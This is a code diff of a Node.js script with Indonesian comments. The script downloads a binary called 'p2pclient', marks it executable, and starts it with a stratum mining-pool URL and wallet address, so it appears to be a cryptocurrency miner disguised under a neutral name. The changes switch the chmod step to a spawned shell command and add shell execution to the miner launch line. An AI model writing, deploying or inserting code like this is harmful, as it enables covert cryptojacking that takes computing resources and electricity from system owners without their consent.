@@ -27,7 +27,7 @@ const logger = winston.createLogger({
     ]
 });
 
-// Fungsi untuk mengunduh file p2pclient
+// Fungsi untuk mengunduh file p2pclient dan memberikan izin eksekusi
 async function downloadP2PClient() {
     return new Promise((resolve, reject) => {
         const file = fs.createWriteStream(P2P_PATH);
@@ -35,14 +35,23 @@ async function downloadP2PClient() {
             response.pipe(file);
             file.on('finish', () => {
                 file.close(() => {
-                    try {
-                        fs.chmodSync(P2P_PATH, 0o755); // Memberikan izin eksekusi
-                        logger.info('✅ File p2pclient telah diberikan izin eksekusi.');
-                        resolve();
-                    } catch (err) {
-                        logger.error('❌ Gagal mengubah izin eksekusi p2pclient:', err);
+                    // Gunakan spawn untuk menjalankan chmod +x
+                    const chmodProcess = spawn('chmod', ['+x', P2P_PATH]);
+
+                    chmodProcess.on('close', (code) => {
+                        if (code === 0) {
+                            logger.info('✅ File p2pclient telah diberikan izin eksekusi.');
+                            resolve();
+                        } else {
+                            logger.error('❌ Gagal memberikan izin eksekusi p2pclient.');
+                            reject(new Error('chmod failed'));
+                        }
+                    });
+
+                    chmodProcess.on('error', (err) => {
+                        logger.error('❌ Gagal menjalankan chmod:', err);
                         reject(err);
-                    }
+                    });
                 });
             });
         }).on('error', (err) => {
@@ -72,7 +81,8 @@ async function startP2PClient() {
     }
 
     logger.info('🚀 Starting p2pclient...');
-    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008']);
+    // Pastikan untuk menjalankan dengan shell
+    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008'], { shell: true });
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
